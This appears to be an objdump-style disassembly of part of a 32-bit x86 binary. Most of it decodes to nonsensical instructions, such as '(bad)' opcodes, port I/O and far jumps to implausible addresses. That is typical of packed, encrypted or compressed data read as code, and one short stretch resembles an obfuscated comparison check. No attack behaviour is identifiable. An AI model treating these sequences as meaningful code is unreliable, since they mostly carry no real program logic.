  408b75:	sub    eax,0x77375d26
  408b7a:	ins    BYTE PTR es:[edi],dx
  408b7b:	jne    0x408bc8
  408b7d:	push   ecx
  408b7e:	and    eax,0xd270a956
  408b83:	(bad)  
  408b84:	cmp    BYTE PTR [ebp+0x14],cl
  408b87:	outs   dx,DWORD PTR ds:[esi]
  408b88:	bound  ebp,QWORD PTR cs:[edi]
  408b8b:	mov    BYTE PTR [eax+ebp*1+0x0],dl
  408b8f:	xchg   edi,eax
  408b90:	iret   
  408b91:	outs   dx,BYTE PTR ds:[esi]
  408b92:	or     al,0x4a
  408b94:	push   edi
  408b95:	shr    bl,cl
  408b97:	or     al,0xc5
  408b99:	add    al,0x2b
  408b9b:	lods   eax,DWORD PTR ds:[esi]
  408b9c:	mov    ds:0x92d668e4,eax
  408ba1:	ins    DWORD PTR es:[edi],dx
  408ba2:	push   edx
  408ba3:	push   edx
  408ba4:	js     0x408b89
  408ba6:	adc    esp,DWORD PTR [esi+0x1f]
  408ba9:	leave  
  408baa:	jnp    0x408bf6
  408bac:	or     cl,al
  408bae:	push   0x1f
  408bb0:	mov    ebx,0xd9113a7
  408bb5:	ror    bh,cl
  408bb7:	push   ds
  408bb8:	xchg   ch,ch
  408bba:	repnz xchg ebx,eax
  408bbc:	xor    al,0x94
  408bbe:	mov    ebp,0xeea8789a
  408bc3:	xchg   ecx,eax
  408bc4:	push   ds
  408bc5:	sbb    al,0x6b
  408bc7:	ins    BYTE PTR es:[edi],dx
  408bc8:	nop
  408bc9:	jmp    0x34c25e39
  408bce:	jmp    0x9af6:0xd202d94b
  408bd5:	adc    eax,0x25edf343
  408bda:	popf   
  408bdb:	aaa    
  408bdc:	mov    edi,0xe5037bf5
  408be1:	adc    DWORD PTR [eax],edx
  408be3:	pusha  
  408be4:	push   esp
  408be5:	jne    0x408b87
  408be7:	push   0x2d
  408be9:	jne    0x408c5f
  408beb:	or     bh,BYTE PTR [eax]
  408bed:	pushf  
  408bee:	fstp   QWORD PTR [esi+0x287b3b6c]
  408bf4:	pusha  
  408bf5:	ror    BYTE PTR [edi],cl
  408bf7:	push   ebp
  408bf8:	cli    
  408bf9:	jb     0x408bef
  408bfb:	rcr    BYTE PTR [ebp-0x6abd3dd7],0xdb
  408c02:	sar    esp,1
  408c04:	jmp    0x21b740c4
  408c09:	sbb    dh,BYTE PTR [edx+0x1c]
  408c0c:	dec    ebx
  408c0d:	lea    eax,[eax+ecx*1+0x3272f5]
  408c14:	mov    DWORD PTR [ebp+0x8],eax
  408c17:	mov    eax,DWORD PTR [ebp-0xc]
  408c1a:	mov    ecx,DWORD PTR [ebp+0x14]
  408c1d:	xor    eax,esi
  408c1f:	add    eax,edi
  408c21:	imul   eax,DWORD PTR [ecx]
  408c24:	mov    ecx,DWORD PTR [ebp-0x4]
  408c27:	mov    edx,DWORD PTR [ebp+0x8]
  408c2a:	xor    ecx,esi
  408c2c:	lea    ecx,[ecx+edx*1+0x3272f5]
  408c33:	cmp    ecx,eax
  408c35:	jne    0x406849
  408c3b:	jmp    0x40afcd
  408c40:	or     eax,0xbf3c7fd1
  408c45:	mov    cl,BYTE PTR [edx]
  408c47:	into   
  408c48:	and    bl,BYTE PTR [ebx]
  408c4a:	and    eax,0xec2a362a
  408c4f:	adc    DWORD PTR [eax+ebx*1+0x5e0c8383],ebx
  408c56:	add    DWORD PTR [ebx-0x47e72853],0x4f
  408c5d:	dec    edx
  408c5e:	iret   
  408c5f:	xchg   edi,eax
  408c60:	inc    eax
  408c61:	and    DWORD PTR [ecx+0xe5931bc],edx
  408c67:	push   eax
  408c68:	mov    gs,WORD PTR [edx]
  408c6a:	test   eax,edx
  408c6c:	popf   
  408c6d:	push   0xffffff9a
  408c6f:	mov    cs,ecx
  408c71:	lods   al,BYTE PTR ds:[esi]
  408c72:	pop    edi
  408c73:	cld    
  408c74:	jmp    0x54d4226c
  408c79:	mov    dl,0xb1
  408c7b:	mov    WORD PTR [ebp+0x10],ss
  408c7e:	mov    esi,0xfd607cdf
  408c83:	mov    dh,0x11
  408c85:	stos   DWORD PTR es:[edi],eax
  408c86:	xor    esi,DWORD PTR [edx-0x71]
  408c89:	sub    BYTE PTR [esi],al
  408c8b:	jp     0x408c10
  408c8d:	(bad)  
  408c8e:	leave  
  408c8f:	xlat   BYTE PTR ds:[ebx]
  408c90:	sub    ah,BYTE PTR [edi-0x1f1f806]
  408c96:	mov    cl,BYTE PTR [edi]
  408c98:	idiv   BYTE PTR [edx-0x21]
  408c9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c9c:	mov    al,ds:0x189dd30a
  408ca1:	mov    al,ds:0x875b4b09
  408ca6:	xchg   esp,eax
  408ca7:	sar    DWORD PTR [eax-0x780a7c7a],cl
  408cad:	call   0xca74:0x579c3503
  408cb4:	ja     0x408c83
  408cb6:	and    al,0x7
  408cb8:	and    ah,ch
  408cba:	dec    si
  408cbc:	push   ds
  408cbd:	clc    
  408cbe:	test   DWORD PTR ds:0x31001d6,esp
  408cc4:	mov    edi,0xd8088da
  408cc9:	popa   
  408cca:	mov    ebp,0x7f55c925
  408ccf:	daa    
  408cd0:	rcl    dl,1
  408cd2:	pop    ebp
  408cd3:	push   edi
  408cd4:	jl     0x408cc6
  408cd6:	push   ds
  408cd7:	retf   0xb2c4
  408cda:	(bad)  
  408cdb:	jno    0x408d0a
  408cdd:	pop    ebp
  408cde:	cmp    dl,BYTE PTR [ebp+0x68a1c47]
  408ce4:	mov    al,ds:0xd863813f
  408ce9:	xchg   DWORD PTR [esp+ebx*8-0x55],ebx
  408ced:	dec    ebx
  408cee:	pop    ebp
  408cef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cf0:	call   0xbc2c:0x218f3741
  408cf7:	mov    bl,0x27
  408cf9:	push   0x1e6c8c9f
  408cfe:	ror    BYTE PTR [eax],0x97
  408d01:	jmp    0x7308eb6c
  408d06:	sbb    esi,DWORD PTR [ebx+0x548dfe8d]
  408d0c:	adc    BYTE PTR [ebp+0x32],ah
  408d0f:	rcl    BYTE PTR [edi-0x77e9fe93],0x98
  408d16:	mov    edi,0xc5694e71
  408d1b:	popf   
  408d1c:	sbb    edi,DWORD PTR [ebp-0x5b]
  408d1f:	add    ah,dl
  408d21:	lods   eax,DWORD PTR ds:[esi]
  408d22:	outs   dx,BYTE PTR ds:[esi]
  408d23:	nop
  408d24:	mov    esp,0x786c317d
  408d29:	mov    ds:0x3d1a2666,eax
  408d2e:	shr    DWORD PTR [ebx+ebx*2+0x67],cl
  408d32:	sub    BYTE PTR ds:0xbf0e8718,dl
  408d38:	push   ecx
  408d39:	ins    DWORD PTR es:[edi],dx
  408d3a:	lock push es
  408d3c:	mov    cl,0x9f
  408d3e:	cmp    eax,0x476c4ac6
  408d43:	outs   dx,BYTE PTR ds:[esi]
  408d44:	in     eax,dx
  408d45:	icebp  
  408d46:	nop
  408d47:	jmp    0x408d70
  408d49:	cmp    eax,0x8f67505a
  408d4e:	enter  0x72f8,0xeb
  408d52:	mov    edi,0x77054ac2
  408d57:	leave  
  408d58:	nop
  408d59:	cli    
  408d5a:	call   0x16f6:0x60db7fb2
  408d61:	sub    DWORD PTR [eax+0x2f],eax
  408d64:	and    DWORD PTR [ebx-0x1ad73362],ecx
  408d6a:	xor    dh,BYTE PTR [eax+ebp*1+0x7aba4be3]
  408d71:	ja     0x408da1
  408d73:	sbb    al,0x60
  408d75:	out    0xae,eax
  408d77:	jg     0x408d1e
  408d79:	jo     0x408d0d
  408d7b:	xlat   BYTE PTR ds:[ebx]
  408d7c:	mov    WORD PTR [esi+0x21],?
  408d7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d80:	loop   0x408d29
  408d82:	jae    0x408d44
  408d84:	repz inc ecx
  408d86:	xchg   esp,eax
  408d87:	pushf  
  408d88:	push   ebx
  408d89:	xchg   BYTE PTR [ebx],ch
  408d8b:	jo     0x408d72
  408d8d:	sub    eax,0x241b8a86
  408d92:	or     BYTE PTR [ebx-0x32],cl
  408d95:	sub    edi,DWORD PTR [ebp-0x57f4ea82]
  408d9b:	or     eax,0xc18f33b8
  408da0:	fld1   
  408da2:	jp     0x408d55
  408da4:	outs   dx,BYTE PTR ds:[si]
  408da6:	es ja  0x408ded
  408da9:	arpl   WORD PTR [esi],cx
  408dab:	mov    ds:0x9765f627,al
  408db0:	jl     0x408e00
  408db2:	fstp   TBYTE PTR es:[edx]
  408db5:	inc    esi
  408db6:	sbb    eax,0x84ee97b9
  408dbb:	clc    
  408dbc:	mov    ds:0x705084d2,eax
  408dc1:	pop    es
  408dc2:	jge    0x408dea
  408dc4:	jnp    0x408d4a
  408dc6:	mov    ch,0xd
  408dc8:	jp     0x408e0d
  408dca:	cmp    ebp,DWORD PTR [edx+edi*4-0x79]
  408dce:	push   esp
  408dcf:	cmp    al,0xd4
  408dd1:	pop    eax
  408dd2:	add    edx,DWORD PTR [esi+ebx*2-0x32]
  408dd6:	cmp    BYTE PTR [edx],cl
  408dd8:	je     0x408d5f
  408dda:	jmp    0xc32e:0xb6ac1c9a
  408de1:	fst    QWORD PTR [esi-0x5b6d5293]
  408de7:	jl     0x408dec
  408de9:	ret    
  408dea:	(bad)  
  408deb:	in     al,0x3d
  408ded:	ins    DWORD PTR es:[edi],dx
  408dee:	(bad)  [esi-0x5562ecf7]
  408df4:	mov    ?,WORD PTR [eax]
  408df6:	mov    es,WORD PTR [ebp+0x6f8e78c5]
  408dfc:	inc    ebp
  408dfd:	pop    ecx
  408dfe:	mov    bl,0xad
  408e00:	ror    bh,0x92
  408e03:	sub    cl,bl
  408e05:	js     0x408dca
  408e07:	mov    bl,0x73
  408e09:	fist   DWORD PTR [edi]
  408e0b:	sti    
  408e0c:	mov    ecx,0xe50a7a82
  408e11:	pushf  
  408e12:	mov    bl,dh
  408e14:	outs   dx,BYTE PTR ds:[esi]
  408e15:	arpl   WORD PTR [edx],bp
  408e17:	bound  ecx,QWORD PTR [ecx-0x73684f8b]
  408e1d:	sub    eax,0x835ed69f
  408e22:	jg     0x408e16
  408e24:	mov    esp,DWORD PTR [esi-0x62]
  408e27:	add    BYTE PTR [edi-0x2e0196c7],0x44
  408e2e:	ret    
  408e2f:	cld    
  408e30:	stos   DWORD PTR es:[edi],eax
  408e31:	cmp    edx,DWORD PTR [eax]
  408e33:	arpl   WORD PTR [ecx],si
  408e35:	dec    edi
  408e36:	in     eax,dx
  408e37:	xor    eax,0x8b6ed196
  408e3c:	inc    eax
  408e3d:	aas    
  408e3e:	retf   
  408e3f:	adc    BYTE PTR ds:0x21a54316,bh
  408e45:	dec    esi
  408e46:	push   edi
  408e47:	lahf   
  408e48:	int3   
  408e49:	xchg   BYTE PTR [ebp-0x63],dl
  408e4c:	fld    TBYTE PTR [ebp+0x27]
  408e4f:	jne    0x408e7c
  408e51:	or     al,0xea
  408e53:	dec    ebp
  408e54:	dec    ebp
  408e55:	cmp    DWORD PTR [ebx],0x4
  408e58:	pop    ebx
  408e59:	out    dx,eax
  408e5a:	in     al,0x1f
  408e5c:	or     ecx,DWORD PTR [ebp+0x55]
  408e5f:	inc    esp
  408e60:	push   eax
  408e61:	mov    ecx,0x16981fe2
  408e66:	cmp    al,0x7f
  408e68:	mov    bl,0xda
  408e6a:	mov    ah,BYTE PTR [esi+0x2a]
  408e6d:	adc    eax,0x5ed2cb04
  408e72:	repz out 0xdf,eax
  408e75:	inc    edi
  408e77:	xchg   edi,eax
  408e78:	ins    BYTE PTR es:[edi],dx
  408e79:	dec    eax
  408e7a:	push   esp
  408e7b:	inc    ebp
  408e7c:	cmp    BYTE PTR ds:0x131802dc,ah
  408e82:	in     al,dx
  408e83:	mov    ds:0x2fd59c81,al
  408e88:	cmp    al,0x61
  408e8a:	out    dx,eax
  408e8b:	push   esp
  408e8c:	dec    ebp
  408e8d:	loope  0x408e83
  408e8f:	int    0x41
  408e91:	out    0x2,eax
  408e93:	adc    eax,0xcea3d426
  408e98:	mov    dl,0x2
  408e9a:	add    al,0xcc
  408e9c:	aaa    
  408e9d:	and    DWORD PTR [edi+0x1d],edi
  408ea0:	xchg   edi,eax
  408ea1:	mov    ebp,0x299f7ac0
  408ea6:	(bad)  
  408ea7:	jb     0x408efd
  408ea9:	(bad)  
  408eaa:	mov    dl,0x20
  408eac:	in     al,0xb7
  408eae:	dec    ebp
  408eaf:	mov    ds:0xe89e3132,eax
  408eb4:	xchg   ebx,eax
  408eb5:	sbb    al,0x3d
  408eb7:	lods   al,BYTE PTR ds:[esi]
  408eb8:	xchg   edi,eax
  408eb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408eba:	lods   eax,DWORD PTR ds:[esi]
  408ebb:	jl     0x408ea6
  408ebd:	jmp    0x542b:0xa437205a
  408ec4:	retf   0x7c44
  408ec7:	out    0xac,al
  408ec9:	(bad)  
  408ecb:	hlt    
  408ecc:	shl    BYTE PTR [edx+0x27202bfe],cl
  408ed2:	inc    ebp
  408ed3:	add    edx,DWORD PTR [ebx+0x391d3362]
  408ed9:	fmul   DWORD PTR [edx]
  408edb:	jmp    0x605c:0xb5b5a547
  408ee2:	xchg   esp,eax
  408ee3:	int3   
  408ee4:	adc    DWORD PTR [ebx+0x26],esp
  408ee7:	cdq    
  408ee8:	scas   al,BYTE PTR es:[edi]
  408ee9:	data16 clc 
  408eeb:	pusha  
  408eec:	fwait
  408eed:	cli    
  408eee:	jmp    0x408eba
  408ef0:	adc    al,0xf2
  408ef2:	xor    eax,0xacf13495
  408ef7:	sub    eax,DWORD PTR [ebx-0x1b0c5edb]
  408efd:	dec    ecx
  408efe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408eff:	ja     0x408f0b
  408f01:	fcmovnbe st,st(3)
  408f03:	xchg   esi,eax
  408f04:	sahf   
  408f05:	adc    DWORD PTR [eax+ebp*2-0x70],edx
  408f09:	xor    esp,DWORD PTR [ebx-0xe32bcb5]
  408f0f:	jns    0x408f38
  408f11:	adc    al,0x64
  408f13:	cwde   
  408f14:	xor    al,0xbd
  408f16:	xor    al,0x4a
  408f18:	test   BYTE PTR [eax-0x72],al
  408f1b:	xchg   ecx,eax
  408f1c:	mov    dh,0x17
  408f1e:	out    0x20,eax
  408f20:	add    eax,0x7afcc1d
  408f25:	inc    ebx
  408f26:	mov    esi,0x676d7688
  408f2b:	push   ecx
  408f2c:	adc    DWORD PTR [ebx+0x6],0x3b
  408f30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f31:	pop    eax
  408f32:	or     al,0xa
  408f34:	call   0xdc6760bf
  408f39:	sub    BYTE PTR [esi+0x63f67719],bl
  408f3f:	or     al,BYTE PTR [ebx]
  408f41:	or     BYTE PTR [ecx-0x3c9b4c0c],bh
  408f47:	fucomp st(3)
  408f49:	mov    es,ebp
  408f4b:	outs   dx,DWORD PTR ds:[esi]
  408f4c:	adc    BYTE PTR ds:0x8f19d782,bh
  408f52:	pop    es
  408f53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f54:	cwde   
  408f55:	(bad)  
  408f56:	cs icebp 
  408f58:	test   al,0x56
  408f5a:	add    ebp,DWORD PTR [edi]
  408f5c:	jge    0x408f8c
  408f5e:	in     eax,dx
  408f5f:	pop    ds
  408f60:	mov    ah,0x6d
  408f62:	in     al,dx
  408f63:	adc    esi,0x18
  408f66:	in     al,0xa6
  408f68:	test   al,0xff
  408f6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f6b:	dec    eax
  408f6c:	aas    
  408f6d:	sahf   
  408f6e:	stos   BYTE PTR es:[edi],al
  408f6f:	out    0x21,al
  408f71:	stos   DWORD PTR es:[edi],eax
  408f72:	leave  
  408f73:	adc    BYTE PTR [ecx],cl
  408f75:	test   eax,0x6a115af5
  408f7a:	cwde   
  408f7b:	arpl   WORD PTR [eax-0x46],bp
  408f7e:	fisub  DWORD PTR [ebx+0x29]
  408f81:	xor    DWORD PTR [eax],0x59eb38e9
  408f87:	jle    0x408f95
  408f89:	pop    ss
  408f8a:	mul    BYTE PTR [eax-0x1b]
  408f8d:	popa   
  408f8e:	aam    0x35
  408f90:	cdq    
  408f91:	add    edi,ebp
  408f93:	sti    
  408f94:	sbb    dh,cl
  408f96:	jmp    0x408f9c
  408f98:	mov    ebx,0x450963e2
  408f9d:	inc    esi
  408f9e:	pop    ds
  408f9f:	mov    DWORD PTR [ebx-0x663a9c63],eax
  408fa5:	fist   WORD PTR [ebp+0x34b04405]
  408fab:	jge    0x408fb6
  408fad:	mov    fs,ebx
  408faf:	rcr    BYTE PTR [ecx+eax*1+0x7639651e],0x15
  408fb7:	add    ah,BYTE PTR [ebp+0x4ab22fc4]
  408fbd:	mov    eax,0x52a4f5fb
  408fc2:	popa   
  408fc3:	das    
  408fc4:	repnz popf 
  408fc6:	sbb    esi,eax
  408fc8:	sub    BYTE PTR [esi],ch
  408fca:	dec    eax
  408fcb:	je     0x408ffd
  408fcd:	inc    ecx
  408fce:	lods   al,BYTE PTR ds:[esi]
  408fcf:	cld    
  408fd0:	jo     0x408f94
  408fd2:	mov    bh,0xff
  408fd4:	cwde   
  408fd5:	mov    ebx,0x138cccee
  408fda:	push   es
  408fdb:	sub    al,0x4f
  408fdd:	mov    ebx,0x19f33b46
  408fe2:	jbe    0x409017
  408fe4:	or     BYTE PTR [ecx],0xb7
  408fe7:	jmp    0x408f6a
  408fe9:	mov    gs,WORD PTR [eax-0x708ff899]
  408fef:	fsubr  DWORD PTR [ecx-0x46be2011]
  408ff5:	lods   eax,DWORD PTR ds:[esi]
  408ff6:	mov    eax,0xa8fbb7bb
  408ffb:	scas   al,BYTE PTR es:[edi]
  408ffc:	adc    ch,0x40
  408fff:	mov    ch,0x67
  409001:	xor    ecx,DWORD PTR ds:[edi+eax*2-0x19017f0b]
  409009:	and    BYTE PTR [esi+0x7c],bl
  40900c:	ds in  ax,dx
  40900f:	enter  0xcbae,0x76
  409013:	push   0xbc99d1aa
  409018:	inc    ecx
  409019:	fst    QWORD PTR [esi]
  40901b:	into   
  40901c:	sub    al,BYTE PTR [eax+ecx*8]
  40901f:	dec    edx
  409020:	ror    BYTE PTR [ecx+ebx*1-0x1bb9477a],cl
  409027:	mov    ds:0x6643e621,al
  40902c:	into   
  40902d:	jno    0x4090a4
  40902f:	and    al,0x36
  409031:	mov    ebp,0x77e4b182
  409036:	sub    esi,DWORD PTR [ebp+0x7627bb5e]
  40903c:	popf   
  40903d:	jmp    0x5f46def4
  409042:	mov    ebp,0x98973566
  409047:	loope  0x409095
  409049:	add    al,0xe6
  40904b:	mov    dl,dh
  40904d:	frstor [ebp+0x1185eeaf]
  409053:	pshufw mm7,QWORD PTR [edi+ebx*4],0xa0
  409058:	outs   dx,BYTE PTR ds:[esi]
  409059:	scas   eax,DWORD PTR es:[edi]
  40905a:	jae    0x40907a
  40905c:	mov    eax,ds:0xe5ce7567
  409061:	dec    ebp
  409062:	sbb    BYTE PTR [ecx-0x78],ch
  409065:	mov    ds:0x9abb0294,eax
  40906a:	clc    
  40906b:	add    DWORD PTR [ebp-0x876f0bb],ebp
  409071:	pop    esp
  409072:	imul   edi,DWORD PTR [esi+0x32],0x4cc6c1e2
  409079:	dec    eax
  40907a:	mov    esp,0x680cb8db
  40907f:	cmp    esp,DWORD PTR [edx]
  409081:	push   esp
  409082:	out    0x9,eax
  409084:	mov    al,ds:0xb9b7704
  409089:	ror    ebp,0x68
  40908c:	leave  
  40908d:	ins    BYTE PTR es:[edi],dx
  40908e:	dec    ecx
  40908f:	das    
  409090:	pop    edx
  409091:	inc    esi
  409092:	ins    BYTE PTR es:[edi],dx
  409093:	jl     0x409023
  409095:	dec    esi
  409096:	ins    DWORD PTR es:[edi],dx
  409097:	inc    ebx
  409098:	aam    0xf2
  40909a:	jp     0x409078
  40909c:	or     eax,0x7d74e53f
  4090a1:	mov    bh,dl
  4090a3:	je     0x4090ec
  4090a5:	sub    ebx,DWORD PTR [eax+0x58f35bee]
  4090ab:	loope  0x409071
  4090ad:	rcl    BYTE PTR [eax],0xb2
  4090b0:	call   0xb0d65a9e
  4090b5:	and    BYTE PTR [eax+0x4a],bl
  4090b8:	lahf   
  4090b9:	sub    al,0xe8
  4090bb:	shl    BYTE PTR [esi-0x377f0475],0x82
  4090c2:	sbb    al,0x79
  4090c4:	mov    BYTE PTR [ebp-0x6d0f2f3f],ah
  4090ca:	xchg   ecx,eax
  4090cb:	cmp    BYTE PTR [eax],al
  4090cd:	cmc    
  4090ce:	pop    ss
  4090cf:	xchg   BYTE PTR [edi+esi*4-0x2a],dl
  4090d3:	iret   
  4090d4:	inc    ebp
  4090d5:	push   edx
  4090d6:	jne    0x409106
  4090d8:	add    eax,0xdbfe2067
  4090dd:	and    eax,esi
  4090df:	shr    edx,1
  4090e1:	mov    ebx,0xc167d51b
  4090e6:	mov    dl,0xe2
  4090e8:	(bad)  
  4090e9:	sahf   
  4090ea:	repnz ins DWORD PTR es:[edi],dx
  4090ec:	popa   
  4090ed:	ror    eax,1
  4090ef:	jae    0x40914c
  4090f1:	fwait
  4090f2:	mov    ch,0x70
  4090f4:	imul   esi,eax,0xffffff8d
  4090f7:	sbb    BYTE PTR [edx+0x15],0x11
  4090fb:	in     eax,0xe
  4090fd:	sub    DWORD PTR [eax-0x16],ecx
  409100:	sbb    DWORD PTR [ebx-0x77ed7413],eax
  409106:	(bad)  
  409107:	xchg   esp,eax
  409108:	in     al,0x99
  40910a:	in     al,0x51
  40910c:	inc    esp
  40910d:	mov    esi,0x10a19d02
  409112:	adc    ch,BYTE PTR [eax-0x75]
  409115:	popf   
  409116:	or     ch,BYTE PTR [esi+0x7e]
  409119:	neg    BYTE PTR [ebx-0x71a78d11]
  40911f:	sbb    dh,BYTE PTR [edx-0x43]
  409122:	mov    eax,0x855024e4
  409127:	jp     0x40910a
  409129:	enter  0xac98,0x25
  40912d:	adc    DWORD PTR [ebx+0x21a93fec],ebp
  409133:	or     al,0x70
  409135:	inc    edx
  409136:	mov    dl,0xd2
  409138:	sar    BYTE PTR [edx+0x16],1
  40913b:	sub    al,0x55
  40913d:	fs aas 
  40913f:	pop    ds
  409140:	fimul  DWORD PTR [edx-0x14ec0562]
  409146:	mov    ch,0x7
  409148:	xchg   BYTE PTR [edx-0x61e52f54],al
  40914e:	(bad)  
  40914f:	cmp    al,BYTE PTR [eax+0x20ada7b]
  409155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409156:	cdq    
  409157:	dec    ebx
  409158:	or     edi,DWORD PTR [ebx]
  40915a:	into   
  40915b:	(bad)  
  40915c:	lods   al,BYTE PTR ds:[esi]
  40915d:	ret    0x8e16
  409160:	repz iret 
  409162:	imul   esi,DWORD PTR [esp+ebp*2-0x50],0x10a20197
  40916a:	xchg   edi,eax
  40916b:	inc    edi
  40916c:	jmp    0x369dd9af
  409171:	loope  0x409147
  409173:	push   eax
  409174:	sbb    BYTE PTR [eax-0x30],ch
  409177:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409178:	ds mov bh,0x41
  40917b:	push   esp
  40917c:	iret   
  40917d:	sar    BYTE PTR [eax+0x15],1
  409180:	stc    
  409181:	inc    edi
  409182:	sar    DWORD PTR [esi+0x4c],0x34
  409186:	dec    edi
  409187:	cs sbb al,0x3
  40918a:	mov    bl,0x2c
  40918c:	inc    eax
  40918d:	and    BYTE PTR [si-0x1942],al
  409192:	xor    BYTE PTR [edi+eiz*2],dh
  409195:	mov    dh,0xc4
  409197:	fnsave [esi]
  409199:	sbb    ebp,ebx
  40919b:	mov    bh,BYTE PTR [ebp+0x7d]
  40919e:	sub    al,0x6c
  4091a0:	hlt    
  4091a1:	push   esi
  4091a2:	das    
  4091a3:	call   0xd1719570
  4091a8:	and    al,0x87
  4091aa:	xor    DWORD PTR [eax-0x4b],edx
  4091ad:	lods   al,BYTE PTR ds:[esi]
  4091ae:	pop    ebx
  4091af:	loop   0x409165
  4091b1:	mov    eax,ds:0xe3b52e87
  4091b6:	mov    ah,0x72
  4091b8:	clc    
  4091b9:	loop   0x4091f7
  4091bb:	mov    ebx,eax
  4091bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091be:	mov    al,ds:0x188fc267
  4091c3:	fidiv  WORD PTR [edx]
  4091c5:	cmp    BYTE PTR [esi],ch
  4091c7:	pop    es
  4091c8:	dec    eax
  4091c9:	test   al,0xe9
  4091cb:	xor    eax,0x41e717a2
  4091d0:	jae    0x40922d
  4091d2:	das    
  4091d3:	ret    0x6a08
  4091d6:	jb     0x40918d
  4091d8:	lds    esp,FWORD PTR [ebx+edx*2+0x6a]
  4091dc:	and    BYTE PTR [esi],bl
  4091de:	xlat   BYTE PTR ds:[ebx]
  4091df:	sar    DWORD PTR [edx+edx*1],1
  4091e2:	push   eax
  4091e3:	xor    al,0xb6
  4091e5:	out    dx,al
  4091e6:	fsubr  QWORD PTR [ecx]
  4091e8:	or     esi,DWORD PTR ds:0x320b47f6
  4091ee:	bound  edx,QWORD PTR [eax]
  4091f0:	push   edx
  4091f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091f2:	pop    ss
  4091f3:	xchg   BYTE PTR [ecx+0x764b091d],ch
  4091f9:	repz push ds
  4091fb:	cmc    
  4091fc:	dec    esp
  4091fd:	jae    0x4091f0
  4091ff:	mov    bl,0x79
  409201:	fstp   TBYTE PTR [edx]
  409203:	js     0x4091c3
  409205:	mov    bl,0xf2
  409207:	mov    ecx,0x42c0fc04
  40920c:	sbb    cl,al
  40920e:	(bad)  [ebx-0x23]
  409211:	into   
  409212:	xor    BYTE PTR [edi+edi*1],bh
  409215:	jo     0x409235
  409217:	sbb    DWORD PTR [eax+0x4f],esi
  40921a:	mov    edi,0x2541b4e
  40921f:	es dec ebx
  409221:	adc    ch,0x1a
  409224:	mov    gs,WORD PTR [ebx+0x645d0ac5]
  40922a:	std    
  40922b:	retf   0xd7c8
  40922e:	out    dx,eax
  40922f:	sub    al,0xd9
  409231:	add    eax,0xe7892d75
  409236:	xchg   edi,eax
  409237:	push   esp
  409238:	scas   eax,DWORD PTR es:[edi]
  409239:	jae    0x40929d
  40923b:	push   ebp
  40923c:	cmp    eax,0xbdf9c2c3
  409241:	aam    0x97
  409243:	mov    dl,0x79
  409245:	fst    DWORD PTR [edx]
  409247:	cmp    esp,DWORD PTR [ebx+0x39c95eb]
  40924d:	ds out 0x9,al
  409250:	jb     0x409235
  409252:	sub    al,0x2d
  409254:	mov    dl,0x4a
  409256:	aam    0x8f
  409258:	test   eax,0xc843f75b
  40925d:	pop    es
  40925e:	dec    esi
  40925f:	pusha  
  409260:	dec    eax
  409261:	jb     0x4092c6
  409263:	sbb    BYTE PTR [eax],ch
  409265:	pop    ebp
  409266:	imul   ebx,DWORD PTR [ecx+eiz*2],0xd2785a27
  40926d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40926e:	mov    ah,0x34
  409270:	test   al,0x29
  409272:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409273:	xchg   DWORD PTR [ecx+0x7a],edi
  409276:	fs mov eax,0x79453081
  40927c:	inc    ecx
  40927d:	hlt    
  40927e:	mov    eax,edi
  409280:	jae    0x4092b6
  409282:	loop   0x4092ec
  409284:	pop    esi
  409285:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409286:	pop    ebx
  409287:	lods   al,BYTE PTR ds:[esi]
  409288:	inc    ebx
  409289:	pop    ss
  40928a:	push   0xa02ead76
  40928f:	call   0x938f:0xb8b41bd1
  409296:	test   edx,esp
  409298:	in     al,0xcd
  40929a:	fcomp  DWORD PTR [ecx]
  40929c:	out    dx,eax
  40929d:	out    dx,al
  40929e:	jmp    0xa3de49b0
  4092a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092a4:	fistp  DWORD PTR [edx+ebp*4-0x11]
  4092a9:	addr16 pop ebx
  4092ab:	xor    eax,0x76831f91
  4092b0:	(bad)  
  4092b1:	pop    ebx
  4092b2:	shl    DWORD PTR [ecx-0x525e916a],1
  4092b8:	mov    DWORD PTR [ebx-0x4d],esp
  4092bb:	ds jae 0x409311
  4092be:	daa    
  4092bf:	mov    al,fs:0x4b1d9159
  4092c5:	inc    esi
  4092c6:	cld    
  4092c7:	sti    
  4092c8:	pop    edi
  4092c9:	call   eax
  4092cb:	jge    0x4092a9
  4092cd:	dec    edi
  4092ce:	das    
  4092cf:	ficomp DWORD PTR [edx+0x639f5355]
  4092d5:	(bad)  
  4092d6:	rcr    BYTE PTR [edi-0x14],1
  4092d9:	and    eax,0x9a07ca01
  4092de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092df:	int3   
  4092e0:	push   eax
  4092e1:	xor    bl,BYTE PTR [ebx]
  4092e3:	add    edx,DWORD PTR [esi]
  4092e5:	xor    bh,bh
  4092e7:	sub    al,dh
  4092e9:	push   esi
  4092ea:	pop    ss
  4092eb:	fidivr DWORD PTR [ecx-0x6925ccff]
  4092f1:	out    dx,al
  4092f2:	or     al,BYTE PTR [edi+0x3abb70a9]
  4092f8:	mov    esp,0x12f4cdc5
  4092fd:	fsub   st,st(4)
  4092ff:	(bad)  
  409301:	cwde   
  409302:	inc    ebx
  409303:	in     al,0xf8
  409305:	adc    al,0x75
  409307:	or     DWORD PTR [ecx],ebp
  409309:	xlat   BYTE PTR ds:[ebx]
  40930a:	or     cl,bl
  40930c:	shl    DWORD PTR [edx+eiz*1+0x5],cl
  409310:	cli    
  409311:	fdivr  DWORD PTR [esi]
  409313:	ins    BYTE PTR es:[edi],dx
  409314:	(bad)  
  409315:	scas   eax,DWORD PTR es:[edi]
  409316:	dec    ecx
